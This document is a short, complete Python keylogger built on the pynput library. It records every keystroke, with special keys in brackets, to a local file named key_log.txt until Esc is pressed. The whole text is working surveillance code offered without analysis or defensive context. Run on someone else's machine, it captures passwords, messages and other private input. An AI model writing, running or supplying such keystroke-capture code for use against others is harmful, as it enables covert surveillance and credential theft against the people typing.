from pynput import keyboard

# Define the file where keystrokes will be logged
log_file = "key_log.txt"

def on_press(key):
    try:
        # Write the key to the log file
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as f:
            f.write("[" + str(key) + "]")

def on_release(key):
    # Stop listener
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
